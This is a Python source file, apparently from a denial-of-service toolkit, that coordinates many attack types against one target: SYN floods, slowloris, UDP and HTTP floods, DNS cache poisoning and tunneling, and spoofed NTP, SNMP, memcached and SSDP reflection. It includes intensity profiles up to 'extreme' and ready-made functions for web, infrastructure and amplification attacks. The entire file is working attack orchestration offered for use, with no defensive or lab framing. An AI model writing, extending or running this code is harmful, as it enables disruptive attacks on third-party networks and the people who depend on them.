#!/usr/bin/env python3
"""
Multi-Vector Attack Coordinator
Coordinates and orchestrates attacks across all protocol engines
"""

import asyncio
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum

from .tcp_engine import TCPEngine, TCPAttackConfig
from .udp_engine import ExtremeUDPEngine, UDPAttackConfig
from .http_engine import ModernHTTPEngine, HTTPAttackConfig
from .dns_engine import DNSWeaponizationEngine, DNSAttackConfig
from .reflection_engine import ReflectionAmplificationEngine, ReflectionAttackConfig

class AttackVectorType(Enum):
    """Available attack vector types"""
    TCP_SYN_FLOOD = "tcp_syn_flood"
    TCP_CONNECTION_EXHAUSTION = "tcp_connection_exhaustion"
    TCP_SLOWLORIS = "tcp_slowloris"
    TCP_FRAGMENTATION = "tcp_fragmentation"
    
    UDP_FLOOD = "udp_flood"
    UDP_AMPLIFICATION = "udp_amplification"
    UDP_FRAGMENTATION = "udp_fragmentation"
    
    HTTP_FLOOD = "http_flood"
    HTTP_SLOWLORIS = "http_slowloris"
    HTTP2_STREAMS = "http2_streams"
    WEBSOCKET_ABUSE = "websocket_abuse"
    CACHE_POISONING = "cache_poisoning"
    
    DNS_AMPLIFICATION = "dns_amplification"
    DNS_FLOOD = "dns_flood"
    DNS_CACHE_POISON = "dns_cache_poison"
    DNS_TUNNELING = "dns_tunneling"
    
    NTP_REFLECTION = "ntp_reflection"
    SNMP_REFLECTION = "snmp_reflection"
    MEMCACHED_REFLECTION = "memcached_reflection"
    SSDP_REFLECTION = "ssdp_reflection"

@dataclass
class MultiVectorAttackConfig:
    """Configuration for multi-vector attacks"""
    target: str = "127.0.0.1"
    ports: List[int] = field(default_factory=lambda: [80, 443, 53, 8080])
    attack_vectors: List[AttackVectorType] = field(default_factory=list)
    duration: float = 0  # 0 = infinite
    intensity: str = "medium"  # low, medium, high, extreme
    coordination_mode: str = "simultaneous"  # simultaneous, sequential, adaptive
    enable_spoofing: bool = False
    custom_payloads: Dict[str, bytes] = field(default_factory=dict)
    amplification_servers: Dict[str, List[str]] = field(default_factory=dict)

class AttackIntensityProfiles:
    """Predefined attack intensity profiles"""
    
    PROFILES = {
        "low": {
            "tcp_connections": 100,
            "udp_burst_size": 100,
            "http_connections": 50,
            "dns_query_rate": 1000,
            "reflection_workers": 5
        },
        "medium": {
            "tcp_connections": 1000,
            "udp_burst_size": 1000,
            "http_connections": 500,
            "dns_query_rate": 10000,
            "reflection_workers": 20
        },
        "high": {
            "tcp_connections": 5000,
            "udp_burst_size": 5000,
            "http_connections": 2000,
            "dns_query_rate": 50000,
            "reflection_workers": 50
        },
        "extreme": {
            "tcp_connections": 10000,
            "udp_burst_size": 10000,
            "http_connections": 5000,
            "dns_query_rate": 100000,
            "reflection_workers": 100
        }
    }

class MultiVectorAttackCoordinator:
    """Coordinates multi-vector attacks across all protocol engines"""
    
    def __init__(self, config: MultiVectorAttackConfig = None):
        self.config = config or MultiVectorAttackConfig()
        self.intensity_profile = AttackIntensityProfiles.PROFILES.get(
            self.config.intensity, AttackIntensityProfiles.PROFILES["medium"]
        )
        
        # Initialize attack engines
        self.engines = {}
        self._initialize_engines()
        
        # Attack coordination
        self.active_attacks = {}
        self.attack_stats = {
            'start_time': None,
            'total_packets_sent': 0,
            'total_bytes_sent': 0,
            'active_vectors': set(),
            'engine_stats': {}
        }
    
    def _initialize_engines(self) -> None:
        """Initialize all attack engines with appropriate configurations"""
        
        # TCP Engine
        tcp_config = TCPAttackConfig(
            target=self.config.target,
            port=self.config.ports[0] if self.config.ports else 80,
            enable_spoofing=self.config.enable_spoofing,
            max_connections=self.intensity_profile["tcp_connections"]
        )
        self.engines['tcp'] = TCPEngine(tcp_config)
        
        # UDP Engine
        udp_config = UDPAttackConfig(
            target=self.config.target,
            port=self.config.ports[0] if self.config.ports else 80,
            enable_spoofing=self.config.enable_spoofing,
            burst_size=self.intensity_profile["udp_burst_size"]
        )
        self.engines['udp'] = ExtremeUDPEngine(udp_config)
        
        # HTTP Engine
        http_port = 443 if 443 in self.config.ports else (80 if 80 in self.config.ports else self.config.ports[0])
        http_config = HTTPAttackConfig(
            target=self.config.target,
            port=http_port,
            use_ssl=(http_port == 443),
            max_connections=self.intensity_profile["http_connections"],
            custom_payload=self.config.custom_payloads.get('http')
        )
        self.engines['http'] = ModernHTTPEngine(http_config)
        
        # DNS Engine
        dns_port = 53 if 53 in self.config.ports else 53
        dns_config = DNSAttackConfig(
            target=self.config.target,
            port=dns_port,
            enable_spoofing=self.config.enable_spoofing,
            max_query_rate=self.intensity_profile["dns_query_rate"],
            amplification_servers=self.config.amplification_servers.get('dns'),
            tunnel_data=self.config.custom_payloads.get('dns_tunnel')
        )
        self.engines['dns'] = DNSWeaponizationEngine(dns_config)
        
        # Reflection Engine
        reflection_config = ReflectionAttackConfig(
            target=self.config.target,
            enable_spoofing=self.config.enable_spoofing,
            amplification_servers=self.config.amplification_servers
        )
        self.engines['reflection'] = ReflectionAmplificationEngine(reflection_config)
    
    async def execute_attack(self) -> None:
        """Execute the coordinated multi-vector attack"""
        self.attack_stats['start_time'] = time.time()
        
        if self.config.coordination_mode == "simultaneous":
            await self._execute_simultaneous_attack()
        elif self.config.coordination_mode == "sequential":
            await self._execute_sequential_attack()
        elif self.config.coordination_mode == "adaptive":
            await self._execute_adaptive_attack()
        else:
            raise ValueError(f"Unknown coordination mode: {self.config.coordination_mode}")
    
    async def _execute_simultaneous_attack(self) -> None:
        """Execute all attack vectors simultaneously"""
        tasks = []
        
        for vector in self.config.attack_vectors:
            task = self._create_attack_task(vector)
            if task:
                tasks.append(task)
                self.attack_stats['active_vectors'].add(vector.value)
        
        # Add statistics collection task
        tasks.append(asyncio.create_task(self._stats_collector()))
        
        try:
            if self.config.duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.config.duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                if not task.done():
                    task.cancel()
    
    async def _execute_sequential_attack(self) -> None:
        """Execute attack vectors sequentially"""
        vector_duration = self.config.duration / len(self.config.attack_vectors) if self.config.duration > 0 else 30
        
        for vector in self.config.attack_vectors:
            print(f"Executing {vector.value} for {vector_duration} seconds...")
            
            task = self._create_attack_task(vector)
            if task:
                self.attack_stats['active_vectors'].add(vector.value)
                
                try:
                    await asyncio.wait_for(task, timeout=vector_duration)
                except asyncio.TimeoutError:
                    pass
                finally:
                    if not task.done():
                        task.cancel()
                
                self.attack_stats['active_vectors'].discard(vector.value)
                await asyncio.sleep(1)  # Brief pause between vectors
    
    async def _execute_adaptive_attack(self) -> None:
        """Execute adaptive attack that adjusts based on effectiveness"""
        # Start with all vectors
        tasks = []
        vector_effectiveness = {}
        
        for vector in self.config.attack_vectors:
            task = self._create_attack_task(vector)
            if task:
                tasks.append((vector, task))
                vector_effectiveness[vector] = 0
                self.attack_stats['active_vectors'].add(vector.value)
        
        # Monitor and adapt
        adaptation_interval = 30  # Adapt every 30 seconds
        start_time = time.time()
        
        try:
            while self.config.duration == 0 or (time.time() - start_time) < self.config.duration:
                # Run for adaptation interval
                await asyncio.sleep(adaptation_interval)
                
                # Evaluate effectiveness and adapt
                await self._adapt_attack_vectors(vector_effectiveness)
                
        finally:
            for vector, task in tasks:
                if not task.done():
                    task.cancel()
    
    def _create_attack_task(self, vector: AttackVectorType) -> Optional[asyncio.Task]:
        """Create attack task for specific vector"""
        
        if vector == AttackVectorType.TCP_SYN_FLOOD:
            return asyncio.create_task(
                self.engines['tcp'].syn_flood_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.TCP_CONNECTION_EXHAUSTION:
            return asyncio.create_task(
                self.engines['tcp'].connection_exhaustion_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.TCP_SLOWLORIS:
            return asyncio.create_task(
                self.engines['tcp'].slowloris_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.TCP_FRAGMENTATION:
            return asyncio.create_task(
                self.engines['tcp'].tcp_fragmentation_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.UDP_FLOOD:
            return asyncio.create_task(
                self.engines['udp'].high_rate_udp_flood(self.config.duration)
            )
        
        elif vector == AttackVectorType.UDP_AMPLIFICATION:
            return asyncio.create_task(
                self.engines['udp'].reflection_amplification_attack(
                    ["DNS", "NTP", "SNMP"], self.config.duration
                )
            )
        
        elif vector == AttackVectorType.HTTP_FLOOD:
            return asyncio.create_task(
                self.engines['http'].http_flood_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.HTTP_SLOWLORIS:
            return asyncio.create_task(
                self.engines['http'].slowloris_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.HTTP2_STREAMS:
            return asyncio.create_task(
                self.engines['http'].http2_specific_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.WEBSOCKET_ABUSE:
            return asyncio.create_task(
                self.engines['http'].websocket_abuse_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.CACHE_POISONING:
            return asyncio.create_task(
                self.engines['http'].cache_poisoning_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.DNS_AMPLIFICATION:
            return asyncio.create_task(
                self.engines['dns'].dns_amplification_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.DNS_FLOOD:
            return asyncio.create_task(
                self.engines['dns'].dns_query_flood(self.config.duration)
            )
        
        elif vector == AttackVectorType.DNS_CACHE_POISON:
            return asyncio.create_task(
                self.engines['dns'].cache_poisoning_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.DNS_TUNNELING:
            return asyncio.create_task(
                self.engines['dns'].dns_tunneling_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.NTP_REFLECTION:
            return asyncio.create_task(
                self.engines['reflection'].ntp_reflection_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.SNMP_REFLECTION:
            return asyncio.create_task(
                self.engines['reflection'].snmp_reflection_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.MEMCACHED_REFLECTION:
            return asyncio.create_task(
                self.engines['reflection'].memcached_reflection_attack(self.config.duration)
            )
        
        elif vector == AttackVectorType.SSDP_REFLECTION:
            return asyncio.create_task(
                self.engines['reflection'].ssdp_reflection_attack(self.config.duration)
            )
        
        return None
    
    async def _adapt_attack_vectors(self, effectiveness: Dict[AttackVectorType, float]) -> None:
        """Adapt attack vectors based on effectiveness"""
        # Collect current stats
        current_stats = self.get_comprehensive_stats()
        
        # Simple effectiveness calculation based on packets sent
        for vector in effectiveness.keys():
            engine_name = self._get_engine_name_for_vector(vector)
            if engine_name in current_stats['engines']:
                engine_stats = current_stats['engines'][engine_name]
                # Use packets sent as effectiveness metric
                effectiveness[vector] = engine_stats.get('packets_sent', 0) + engine_stats.get('requests_sent', 0)
        
        # Identify least effective vectors
        if len(effectiveness) > 2:
            sorted_vectors = sorted(effectiveness.items(), key=lambda x: x[1])
            least_effective = sorted_vectors[0][0]
            
            print(f"Adapting: {least_effective.value} showing low effectiveness")
            # In a real implementation, you might stop the least effective vector
            # and start a more effective one
    
    def _get_engine_name_for_vector(self, vector: AttackVectorType) -> str:
        """Get engine name for attack vector"""
        if vector.value.startswith('tcp'):
            return 'tcp'
        elif vector.value.startswith('udp'):
            return 'udp'
        elif vector.value.startswith('http'):
            return 'http'
        elif vector.value.startswith('dns'):
            return 'dns'
        else:
            return 'reflection'
    
    async def _stats_collector(self) -> None:
        """Collect and aggregate statistics from all engines"""
        while True:
            await asyncio.sleep(5)  # Collect stats every 5 seconds
            
            total_packets = 0
            total_bytes = 0
            
            for engine_name, engine in self.engines.items():
                stats = engine.get_stats()
                self.attack_stats['engine_stats'][engine_name] = stats
                
                # Aggregate totals
                total_packets += stats.get('packets_sent', 0) + stats.get('requests_sent', 0) + stats.get('queries_sent', 0) + stats.get('reflection_requests', 0)
                total_bytes += stats.get('bytes_sent', 0)
            
            self.attack_stats['total_packets_sent'] = total_packets
            self.attack_stats['total_bytes_sent'] = total_bytes
    
    def get_comprehensive_stats(self) -> Dict[str, Any]:
        """Get comprehensive statistics from all engines"""
        stats = {
            'coordinator': self.attack_stats.copy(),
            'engines': {}
        }
        
        for engine_name, engine in self.engines.items():
            stats['engines'][engine_name] = engine.get_stats()
        
        # Calculate derived metrics
        if self.attack_stats['start_time']:
            duration = time.time() - self.attack_stats['start_time']
            stats['coordinator']['duration'] = duration
            
            if duration > 0:
                stats['coordinator']['packets_per_second'] = self.attack_stats['total_packets_sent'] / duration
                stats['coordinator']['bytes_per_second'] = self.attack_stats['total_bytes_sent'] / duration
        
        return stats
    
    async def stop_attack(self) -> None:
        """Stop all active attacks"""
        for vector, task in self.active_attacks.items():
            if not task.done():
                task.cancel()
        
        self.active_attacks.clear()
        self.attack_stats['active_vectors'].clear()
    
    def add_attack_vector(self, vector: AttackVectorType) -> None:
        """Add attack vector to active configuration"""
        if vector not in self.config.attack_vectors:
            self.config.attack_vectors.append(vector)
    
    def remove_attack_vector(self, vector: AttackVectorType) -> None:
        """Remove attack vector from active configuration"""
        if vector in self.config.attack_vectors:
            self.config.attack_vectors.remove(vector)
    
    def update_intensity(self, intensity: str) -> None:
        """Update attack intensity"""
        if intensity in AttackIntensityProfiles.PROFILES:
            self.config.intensity = intensity
            self.intensity_profile = AttackIntensityProfiles.PROFILES[intensity]
            # Re-initialize engines with new intensity
            self._initialize_engines()

# Convenience functions for common attack scenarios
def create_web_application_attack(target: str, intensity: str = "medium") -> MultiVectorAttackCoordinator:
    """Create coordinated web application attack"""
    config = MultiVectorAttackConfig(
        target=target,
        ports=[80, 443, 8080, 8443],
        attack_vectors=[
            AttackVectorType.HTTP_FLOOD,
            AttackVectorType.HTTP_SLOWLORIS,
            AttackVectorType.TCP_SYN_FLOOD,
            AttackVectorType.UDP_FLOOD
        ],
        intensity=intensity,
        coordination_mode="simultaneous"
    )
    return MultiVectorAttackCoordinator(config)

def create_infrastructure_attack(target: str, intensity: str = "high") -> MultiVectorAttackCoordinator:
    """Create coordinated infrastructure attack"""
    config = MultiVectorAttackConfig(
        target=target,
        ports=[53, 80, 443, 22, 21, 25],
        attack_vectors=[
            AttackVectorType.DNS_AMPLIFICATION,
            AttackVectorType.NTP_REFLECTION,
            AttackVectorType.SNMP_REFLECTION,
            AttackVectorType.TCP_SYN_FLOOD,
            AttackVectorType.UDP_FLOOD,
            AttackVectorType.HTTP_FLOOD
        ],
        intensity=intensity,
        coordination_mode="adaptive"
    )
    return MultiVectorAttackCoordinator(config)

def create_amplification_attack(target: str, intensity: str = "extreme") -> MultiVectorAttackCoordinator:
    """Create coordinated amplification attack"""
    config = MultiVectorAttackConfig(
        target=target,
        attack_vectors=[
            AttackVectorType.DNS_AMPLIFICATION,
            AttackVectorType.NTP_REFLECTION,
            AttackVectorType.SNMP_REFLECTION,
            AttackVectorType.MEMCACHED_REFLECTION,
            AttackVectorType.SSDP_REFLECTION
        ],
        intensity=intensity,
        coordination_mode="simultaneous",
        enable_spoofing=True
    )
    return MultiVectorAttackCoordinator(config)